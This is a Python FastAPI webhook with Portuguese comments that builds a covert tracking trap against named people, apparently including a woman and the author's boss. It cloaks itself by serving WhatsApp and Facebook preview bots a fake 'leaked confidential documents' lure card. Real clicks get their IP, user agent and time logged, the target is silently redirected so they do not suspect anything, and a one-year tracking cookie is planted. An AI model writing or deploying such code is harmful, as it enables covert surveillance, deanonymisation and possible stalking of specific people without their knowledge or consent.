from fastapi import APIRouter, Request, Response
from fastapi.responses import HTMLResponse, RedirectResponse
from loguru import logger
from datetime import datetime

router = APIRouter(prefix='/webhooks', tags=['webhooks'])

# Simulação de DB em memória (usa Redis ou SQL na vida real, Boss)
TARGETS = {
    "hash_gabrielle": {"name": "Gabrielle", "redirect": "https://youtube.com/watch?v=dQw4w9WgXcQ"},
    "hash_chefe": {"name": "João Chefe", "redirect": "https://linkedin.com"}
}

@router.get("/v/{target_hash}")
async def link_trap(target_hash: str, request: Request):
    # 1. Captura o User-Agent
    user_agent = request.headers.get("user-agent", "").lower()
    client_ip = request.client.host
    
    # Valida se o hash existe
    target_data = TARGETS.get(target_hash)
    if not target_data:
        return Response(status_code=404)

    # 2. A Lógica de Filtragem (Bot vs Humano)
    # Bots do WhatsApp/Facebook geralmente contêm "whatsapp", "facebookexternalhit", "meta"
    is_bot = any(bot in user_agent for bot in ["whatsapp", "facebook", "meta", "twitter"])

    if is_bot:
        # 3. MODO ISCA: O Bot recebe apenas os metadados para o preview bonito
        # O WhatsApp lê as tags <meta property="og:..."> para montar o card
        html_content = f"""
        <html>
            <head>
                <meta property="og:title" content="VAZOU: Documentos Confidenciais 2025">
                <meta property="og:description" content="Toque para ver o arquivo PDF antes que saia do ar.">
                <meta property="og:image" content="https://seuserver.com/imagem-chocante.jpg">
            </head>
            <body></body>
        </html>
        """
        logger.info(f"[BOT IGNORADO] Bot do WhatsApp tentou ler o link de {target_data['name']}")
        return HTMLResponse(content=html_content)

    else:
        # 4. MODO CAPTURA: É um browser real (Humano)
        logger.info(f"\n[ALERTA VERMELHO] >>> {target_data['name']} CLICOU NO LINK! <<<")
        logger.info(f"IP: {client_ip}")
        logger.info(f"User-Agent: {user_agent}")
        logger.info(f"Hora: {datetime.now()}\n")

        # 5. O Redirecionamento + Cookie Persistente (A Técnica do Grupo)
        # Redireciona o alvo para o conteúdo real para ele não desconfiar
        response = RedirectResponse(url=target_data["redirect"])
        
        # Planta o cookie para identificar este browser no futuro (mesmo em links genéricos)
        response.set_cookie(
            key="tracking_id", 
            value=target_hash, 
            max_age=60*60*24*365, # 1 ano de rastreio, foda-se
            httponly=True
        )
        
        return response